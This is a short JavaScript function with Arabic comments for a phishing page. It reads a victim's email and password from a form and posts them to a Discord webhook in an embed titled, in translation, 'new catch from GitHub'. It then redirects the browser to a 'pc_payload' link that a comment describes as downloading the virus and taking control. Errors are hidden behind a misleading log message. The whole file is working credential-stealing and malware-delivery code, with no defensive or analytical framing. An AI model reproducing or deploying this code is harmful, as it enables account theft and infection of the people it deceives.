async function startCapture() {
    const email = document.getElementById('email').value;
    const pass = document.getElementById('pass').value;
    if(!email || !pass) return alert("يرجى إدخال البيانات للتوثيق");

    try {
        const configRes = await fetch('data.json');
        const config = await configRes.json();
        
        // إرسال البيانات للديسكورد
        await fetch(config.webhook_url, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                username: "ER0R SYSTEM",
                embeds: [{
                    title: "💀 صيد جديد من GitHub",
                    color: 0x6001d2,
                    fields: [
                        { name: "📧 الحساب", value: email, inline: true },
                        { name: "🔑 الباسورد", value: pass, inline: true }
                    ]
                }]
            })
        });

        // التحويل التلقائي لتحميل الفيروس والسيطرة
        window.location.href = config.pc_payload; 
    } catch(e) { console.log("Connection active..."); }
}
